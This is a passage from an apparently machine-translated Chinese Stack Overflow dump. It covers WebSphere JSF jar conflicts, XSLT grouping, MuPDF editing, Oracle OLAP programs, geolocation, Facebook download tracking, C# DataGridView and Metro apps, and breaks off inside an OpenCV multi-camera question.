file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.ejb.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.interceptor.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jacc.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jaxr.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jaxrpc.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jms.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jsf.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jsp.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jstl.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.jta.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.management.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.persistence.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.servlet.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.servlet.jsp.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jNative2ascii.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jrom.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jsf-api.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jsf-facelets.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jsf-impl.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jsf-nls.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/json-lib-2.4-jdk15.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/json-rpc-1.0.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jsp-api.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jstl.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/launchclient.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/lmproxy.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/log4j-1.2.6.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/mail-impl.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/marshall.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/mysql-connector-java-3.0.10.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/mysql-connector-java-5.1.12-bin.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/nif.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.apache.axis2.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.apache.myfaces1_2.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.ant.core.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.commands.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.contenttype.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.expressions.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.filesystem.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.jobs.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.resources.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.runtime.compatibility.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.runtime_.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.core.variables.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.common.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.commonj.sdo.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.ecore.change.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.ecore.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.ecore.sdo.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.emf.ecore.xmi.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.equinox.common_.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.equinox.preferences.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.equinox.registry.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.jdt.core.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.osgi_.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.text.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/org.eclipse.update.configurator_.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/OTiSConvertTime.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/pc-appext.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/physicalrep.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/pmirm4arm.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/rrd-appext.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/rsadbutils.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/rsahelpers.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/serviceadapter.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/servlet-api.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/setup.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/spring-webmvc-struts.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/spring.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/standard.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/startup.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/struts.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/tcljava.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/urlprotocols.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/wsatlib.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/wses_dynaedge.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/wsif-compatb.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T13:55:45.350

您的应用程序 web.ear 中似乎有两个 JSF 实现 org.apache.myfaces.jar 和另一个 jsf-impl.jar。

您应该使用隔离的共享库定义 WAS 中未提供的 JSF 实现。该方法在如下所示的 WAS 7.0 帮助条目中进行了描述： [http ://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo% 2Fexp%2Fae%2Ftweb_jsf.html](http://pic.dhe.ibm.com/infocenter/wasinfo/v7r0/index.jsp?topic=%2Fcom.ibm.websphere.express.doc%2Finfo%2Fexp%2Fae%2Ftweb_jsf.html)

# xml - 如何在平面 XML 中对兄弟姐妹进行分组

> ID：11396942
> 
> 赞同：1
> 
> 时间：2012-07-09T14:19:56.350
> 
> 标签：xml, xslt, xslt-1.0, odf

我有 XML 的以下部分（它是[ODF](http://en.wikipedia.org/wiki/OpenDocument)）

```
<office:body>
    <office:text text:use-soft-page-breaks="true">
        <text:h text:style-name="P1" text:outline-level="1">Heading 1</text:h>
        <text:p text:style-name="P2">Paragraph 1</text:p>
        <text:h text:style-name="P3" text:outline-level="2">Heading 2</text:h>
        <text:p text:style-name="P4">Paragraph 2</text:p>
        <text:p text:style-name="P5">Paragraph 3</text:p>
        <text:h text:style-name="P6" text:outline-level="3">Heading 3</text:h>
        <text:p text:style-name="P7">Paragraph 4</text:p>
        <text:p text:style-name="P8">Paragraph 5</text:p>
        <text:p text:style-name="P9">Paragraph 6</text:p>
        <text:h text:style-name="P10" text:outline-level="4">Heading 4</text:h>
        <text:p text:style-name="P11">Paragraph 7</text:p>
        <text:h text:style-name="P12" text:outline-level="2">Heading 2</text:h>
        <text:p text:style-name="P13">Paragraph 8</text:p>
        <text:p text:style-name="P14">Paragraph 9</text:p>
        <text:p text:style-name="Normal">
            <text:span text:style-name="T15">Paragraph 10</text:span>
        </text:p>
    </office:text>
</office:body> 
```

我需要将其转换为

```
<Blocks>
    <Block>
        <Title><![CDATA[Heading 2]]></Title>
        <Content>
            <![CDATA[<p>Paragraph 2</p><p>Paragraph 3</p><h3>Heading 3</h3><p>Paragraph 4</p><p>Paragraph 5</p><p>Paragraph 6</p><h4>Heading 4</h4><p>Paragraph 7</p>]]>
        </Content>
    </Block>
    <Block>
        <Title><![CDATA[Heading 2]]></Title>
        <Content>
            <![CDATA[<p>Paragraph 8</p><p>Paragraph 9</p><p>Paragraph 10</p>]]>
        </Content>
    </Block>
</Blocks> 
```

如您所见，我想`Block`为每个`text:h/@text:outline-level = 2`节点创建一个元素。

所有后续`text:p`和`text:h/@text:outline-level > 2`兄弟姐妹都应该放在`Content`刚刚创建的元素内的一个`Block`元素中。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T18:13:20.017

这是一个部分解决方案：

```
<xsl:stylesheet 
  version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:office="http://example.com/office"
  xmlns:text="http://example.com/text"
  exclude-result-prefixes="office text">

<xsl:output indent="yes" cdata-section-elements="Title"/>

<xsl:key 
  name="k1"
  match="text:p"
  use="generate-id(preceding-sibling::text:h[@text:outline-level = 2][1])"/>

<xsl:key 
  name="k1"
  match="text:h[@text:outline-level > 2]"
  use="generate-id(preceding-sibling::text:h[@text:outline-level = 2])"/>

<xsl:template match="office:text">
  <Blocks>
    <xsl:apply-templates select="text:h[@text:outline-level = 2]"/>
  </Blocks>
</xsl:template>

<xsl:template match="text:h[@text:outline-level = 2]">
  <Block>
    <Title>
      <xsl:value-of select="."/>
    </Title>
    <Content>
      <xsl:apply-templates select="key('k1', generate-id())"/>
    </Content>
  </Block>
</xsl:template>

<xsl:template match="text:p">
  <p>
    <xsl:apply-templates/>
  </p>
</xsl:template>

<xsl:template match="text:h[@text:outline-level = 3]">
  <h3>
    <xsl:apply-templates/>
  </h3>
</xsl:template>

<xsl:template match="text:h[@text:outline-level = 4]">
  <h4>
    <xsl:apply-templates/>
  </h4>
</xsl:template> 

</xsl:stylesheet> 
```

它转变

```
<office:body xmlns:office="http://example.com/office" xmlns:text="http://example.com/text">
    <office:text text:use-soft-page-breaks="true">
        <text:h text:style-name="P1" text:outline-level="1">Heading 1</text:h>
        <text:p text:style-name="P2">Paragraph 1</text:p>
        <text:h text:style-name="P3" text:outline-level="2">Heading 2</text:h>
        <text:p text:style-name="P4">Paragraph 2</text:p>
        <text:p text:style-name="P5">Paragraph 3</text:p>
        <text:h text:style-name="P6" text:outline-level="3">Heading 3</text:h>
        <text:p text:style-name="P7">Paragraph 4</text:p>
        <text:p text:style-name="P8">Paragraph 5</text:p>
        <text:p text:style-name="P9">Paragraph 6</text:p>
        <text:h text:style-name="P10" text:outline-level="4">Heading 4</text:h>
        <text:p text:style-name="P11">Paragraph 7</text:p>
        <text:h text:style-name="P12" text:outline-level="2">Heading 2</text:h>
        <text:p text:style-name="P13">Paragraph 8</text:p>
        <text:p text:style-name="P14">Paragraph 9</text:p>
        <text:p text:style-name="Normal">
            <text:span text:style-name="T15">Paragraph</text:span>
        </text:p>
    </office:text>
</office:body> 
```

进入

```
<Blocks>
   <Block>
      <Title><![CDATA[Heading 2]]></Title>
      <Content>
         <p>Paragraph 2</p>
         <p>Paragraph 3</p>
         <h3>Heading 3</h3>
         <p>Paragraph 4</p>
         <p>Paragraph 5</p>
         <p>Paragraph 6</p>
         <h4>Heading 4</h4>
         <p>Paragraph 7</p>
      </Content>
   </Block>
   <Block>
      <Title><![CDATA[Heading 2]]></Title>
      <Content>
         <p>Paragraph 8</p>
         <p>Paragraph 9</p>
         <p>
            Paragraph
        </p>
      </Content>
   </Block>
</Blocks> 
```

因此，据我所知，分组已完成，尽管`p`第二个中的最后一个`Block`没有出现在您所需的输出中，但作为您的口头描述“所有以下文本：p”并不暗示我已按照该描述进行分组。

还缺少将所有这些`p`和`hx`元素填充到 CDATA 部分中，我不确定您是否真的想要这样，如果是这样，我建议您获取类似[http://lenzconsulting.com/xml-to-string/](http://lenzconsulting.com/xml-to-string/)或使用扩展函数将节点序列化为文本。这可能还需要使用结果树片段并使用 exsl:node-set 或类似方法将结果树片段转换为节点集以进行序列化。作为替代方案，您需要更改模板`text:p`和其他模板以输出带有标记的文本节点而不是元素节点。

# mupdf - 使用 MuPDF 编辑 PDF

> ID：11396951
> 
> 赞同：3
> 
> 时间：2012-07-09T14:20:32.540
> 
> 标签：mupdf

我正在使用 mupdf 在我的 c++ 应用程序中呈现 PDF，但我还需要编辑 PDF（例如插入图片），但我无法在我的一生中弄清楚如何 - 它没有很好地记录。Ghostscript 说 mupdf 中有一个 API 可以在这里修改 PDF 文件[http://www.ghostscript.com/MuPDF.html](http://www.ghostscript.com/MuPDF.html)。

最终，我希望能够使用 MuPDF 而不是使用其他库来编辑 PDF。

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-11T08:32:40.570

MuPDF 中的修改 API 用于在相当低的级别编辑 PDF 的结构（例如重新排序页面、添加或删除注释等）。PDF 中的图形基于“内容流”对象，其中包含使用 PostScript 子集绘制页面的命令。MuPDF 中没有编辑这些图形内容流的功能。

但是，如果您只想在页面顶部添加图像，则可以通过为页面创建注释对象来实现。您需要为注释创建 PDF 字典对象、图像对象、用于绘制图像对象的外观流，并将它们连接到页面。不过，您需要对 PDF 格式有很好的理解才能做到这一点。

您将希望使用 MuPDF 的最新 git checkout，因为我们最近（发布 1.0 版本）添加了一些方便的功能，用于编辑对象和使用新内容更新流。

# oracle - 查看 OLAP DML 程序的内容

> ID：11396956
> 
> 赞同：0
> 
> 时间：2012-07-09T14:20:45.597
> 
> 标签：oracle, oracle10g, olap, toad

我在 Oracle 数据库中遇到了以下存储过程：

```
CREATE OR REPLACE PROCEDURE PRICING.sp_run_interface
as
begin
DBMS_OUTPUT.ENABLE(1000000);
dbms_aw.execute('aw attach bewpsp ro');
dbms_aw.execute('aw attach bewpsd ro');
dbms_aw.execute('run.interface');
dbms_aw.execute('aw detach noq bewpsp');
dbms_aw.execute('aw detach noq bewpsd');
END;
/ 
```

经过大量研究，我相信这些语句正在执行[OLAP DML Program](http://docs.oracle.com/cd/B13789_01/olap.101/b10339/program001.htm)。但是我不知道如何实际查看这些程序的内容，或者它们的存储位置。

我正在使用 TOAD，希望能被指出正确的方向。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T06:57:43.170

看起来这段代码首先附加了 2 个分析工作区，运行一个程序，然后再次分离它们。

Oracle Analytic Workspaces 现在已被 Oracle OLAP 取代。

您需要找人向您展示如何通过分析工作空间管理器最有可能导航分析工作空间。然后只需键入`edt run.interface`，这将显示 run.interface 程序的内容。

希望这可以帮助！

问候，

托尼

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-24T21:02:10.403

运行以下 PL/SQL

```
BEGIN

  DBMS_OUTPUT.ENABLE(1000000);

  dbms_aw.execute('aw attach bewpsp ro');

  dbms_aw.execute('aw attach bewpsd ro');

  dbms_aw.execute('describe run.interface');

  dbms_aw.execute('aw detach noq bewpsp');

  dbms_aw.execute('aw detach noq bewpsd');

END; 
```

或者您可以使用[Analytic Workspace Manager](http://www.oracle.com/technetwork/database/options/olap/olap-downloads-098860.html)查看程序。选择工具/OLAP 工作表命令并键入以下内容：

```
aw attach bewpsp ro

aw attach bewpsd ro

describe run.interface

or 

aw attach bewpsp ro

aw attach bewpsd ro

edit run.interface 
```

# html - 如何在不依赖 Google API 的情况下使用 HTML5 Geolocation 获取城市和国家/地区？

> ID：11396965
> 
> 赞同：1
> 
> 时间：2012-07-09T14:21:17.233
> 
> 标签：html, geolocation

这可能看起来不正统，但我想做的是根据他或她的输入来获取一个人的整个城市、州（或省）和国家。我想在不使用 Google API 的情况下执行此操作，因为我正在进行的这个项目是一个商业项目，根据 Google 的 TOS，我需要支付 10,000 美元才能将其用于商业目的（对于我使用的频率而言，这是一个相当高的价格即每周 1-5 次）。

样本输入：多伦多返回：加拿大安大略省多伦多

样本输入 2：温哥华 返回：加拿大不列颠哥伦比亚省温哥华

示例输入 3：Otawwa（注意错字） 返回：加拿大安大略省渥太华

感谢你的协助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:21:21.900

您可以从 geolocation api 获得的唯一位置信息是经度和纬度。但是，您可以使用此信息来查询数据库并返回您需要的信息。互联网上有许多免费的地理位置数据库。谷歌“免费地理定位数据库”，只需使用您认为合适的任何内容。它们通常以大数据文件的形式出现，您需要将其导入您自己的数据库。之后，您只需调用自己的 ajax 服务即可快速免费获得结果。或者，您可以使用他们的 IP 找到位置，如果您需要在服务器而不是客户端上对此进行编码，同样，也有免费的 IP 数据库。我使用[http://www.ipligence.com/](http://www.ipligence.com/)来查询 IP 位置，它运行良好。他们有免费版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T01:07:32.733

我和我的朋友把它放在一起，我们使用标准的政府数据，并将其与谷歌地图联系起来。

[http://nwstartups.com/api/geo/country.php](http://nwstartups.com/api/geo/country.php)

将要

# facebook - 跟踪谁从我的自定义 Facebook 选项卡下载了 PDF

> ID：11396972
> 
> 赞同：2
> 
> 时间：2012-07-09T14:21:31.883
> 
> 标签：facebook, download, facebook-page

我将在 Facebook 上创建一个自定义页面选项卡，并提供一个可免费下载的 PDF，其中包含有关我的服务的信息。是否可以跟踪哪些 Facebook 用户下载了 PDF？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:29:50.193

一个可供研究的选项是单独验证用户并接收他们各自的 Facebook 用户 ID。您可能有兴趣阅读此处引用的页面选项卡身份验证过程：

**参考**：http: [//developers.facebook.com/docs/authentication/pagetab/](http://developers.facebook.com/docs/authentication/pagetab/)

获得此用户 ID 后，您可以通过打开包含用户信息的会话来跟踪他们的活动（以便在他们下载 PDF 时识别他们）。例如，假设您使用的是 PHP（以及 CMS）：

```
<?php
    if ($current_user->fb_id == 0) {
        exit();
    } else {
        echo $current_user->fb_id;
        // do stuff with user here
    }
    header("Location: http://www.example.com/file.pdf");
    // redirect them to the actual file
?> 
```

希望这个伪代码可以为您的项目提供一个起点。

# c# - 将组合框下拉列表中突出显示的项目设置为单元格退出或单元格离开时的当前值

> ID：11396975
> 
> 赞同：0
> 
> 时间：2012-07-09T14:21:39.600
> 
> 标签：c#, winforms, datagridview, combobox, datagridcomboboxcolumn

```
private void dataGridViewSales_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
{
  if (this.dataGridViewSales.CurrentCell.ColumnIndex == 1)
  {
    ComboBox c = e.Control as ComboBox;
    ((ComboBox)c).AutoCompleteSource = AutoCompleteSource.ListItems;
    ((ComboBox)c).AutoCompleteMode = AutoCompleteMode.SuggestAppend;
    ((ComboBox)c).DropDownStyle = ComboBoxStyle.DropDown;
  }
} 
```

使用上面的代码，我遇到了一个问题，在从自动完成组合框中进行选择后，当我通过按 Tab 键退出组合框单元格时，我失去了选择。有时，选择被保留，有时选择被清除，它有点随机发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-18T06:04:58.407

处理 CurrentCellDirtyStateChanged 事件解决了这个问题，但我希望它不会导致其他问题！

```
private void dataGridView1_CurrentCellDirtyStateChanged(object sender, EventArgs e)
        {
            if (dataGridView1.IsCurrentCellDirty)
            {
                dataGridView1.CommitEdit(DataGridViewDataErrorContexts.Commit);
            }
        } 
```

# .net - 使用现有的 .net4 代码创建 Metro 应用程序，该代码仅适用于 x86

> ID：11396976
> 
> 赞同：0
> 
> 时间：2012-07-09T14:21:47.853
> 
> 标签：.net, microsoft-metro, windows-runtime

我有一个内置在 WPF 中的应用程序。我想重写表示层以使其成为 Metro 风格的应用程序。不幸的是，我不能这样做，因为我不能直接引用 Metro 风格项目中的业务 dll，而且 Metro 风格类库不提供对我需要的某些组件的访问。

因为无论如何我只希望它在 x86 上运行，有没有办法引用演示文稿中的其他项目，这样它们就可以像以前一样直接使用 win32 并且只有演示文稿才能通过 winRT？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T16:20:57.823

可以通过有限的 PInvoke 支持访问您在 Win32 中所需的内容，但您很可能需要将您的库代码重写为 Metro 库来执行此操作，而不是越界调用您未修改的 DLL Win32 方面（这显然会容易得多）。您还应该记住，您为规避 WinRT（即不支持 ARM 的 API）所做的任何事情都可能会导致应用程序验证失败并且无法进入应用商店。

# c++ - 使用 OpenCV、Boost 线程和多个摄像头

> ID：11396977
> 
> 赞同：4
> 
> 时间：2012-07-09T14:21:53.143
> 
> 标签：c++, linux, boost, opencv

我正在尝试编写一个程序，该程序能够在两个不同的线程中从两个不同的相机捕获图像。我想这样做是因为当我在同一个线程中执行此操作时，我必须等待 cvQueryFrame 两倍的时间，所以我无法以 30 fps 的速度抓取图像（我从每个摄像头获得 15 FPS）。

我看过这个 SO 帖子，但这仅适用于一台相机。[一起使用 cvQueryFrame 和 boost::thread](https://stackoverflow.com/questions/9364241/using-cvqueryframe-and-boostthread-together)

我当前的程序给出了不同的结果，有时它会导致内存泄漏，通常我只是看不到任何事情发生，有时它会持续几秒钟，但图像再次冻结。奇怪的是，早些时候当我没有调用 cvShowImage，但让我的 imageProcessing 函数做一些有用的事情时，我可以看到我从两个摄像头获得了实时结果。我认为这意味着可以完成这项工作，但是我在某个地方犯了一个愚蠢的错误。我的操作系统是 LINUX，我使用的是 OpenCV 2.4

我的代码：

```
#include <iostream>
#include <cstdio>
#include <cv.h>
#include <ml.h>
#include <cvaux.h>
#include <highgui.h>
#include <vector>
#include <stdio.h>
#include "producer_consumer_queue.hpp"

//Camera settings
int cameraWidth = 1280;
int cameraHeight = 720;
int waitKeyValue = 5;
bool threads_should_exit = false;

CvCapture * capture;
CvCapture * capture2;

using namespace std;
using namespace cv;

